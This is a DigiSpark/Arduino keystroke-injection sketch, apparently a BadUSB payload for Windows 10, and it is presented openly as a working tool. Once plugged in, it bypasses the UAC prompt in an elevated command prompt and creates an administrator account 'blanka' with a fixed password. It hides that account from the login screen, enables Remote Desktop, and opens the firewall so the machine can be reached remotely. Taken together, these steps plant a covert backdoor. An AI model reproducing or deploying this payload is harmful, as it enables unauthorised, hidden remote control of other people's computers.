//This DigiSpark script creates new local user and adds it to "Administrators" group
//Tested on Windows 10 with English(US) keyboard layout
//Created by Michyus | Edited by Elshan
#include "DigiKeyboard.h"
void setup() {
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000); 
  DigiKeyboard.println("net user blanka Ping@123 /ADD");//adding user
  DigiKeyboard.delay(500);
  DigiKeyboard.println("net localgroup Administrators blanka /ADD");//adding user to admin group
  DigiKeyboard.delay(500);
  DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v blanka /t REG_DWORD /d 0 /f"));//Hiding user from login screen
  DigiKeyboard.delay(500);
  DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"));//Turning Remote desktop
  DigiKeyboard.delay(500);
  DigiKeyboard.println(F("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=yes"));//Allowing remote desktop through firewall
  DigiKeyboard.delay(500);
  DigiKeyboard.println("net localgroup \"Remote Desktop Users\" blanka /add");//adding created user to remote desktop group
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("exit");//adding created user to remote desktop group
  DigiKeyboard.delay(500);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}

void loop() {
}
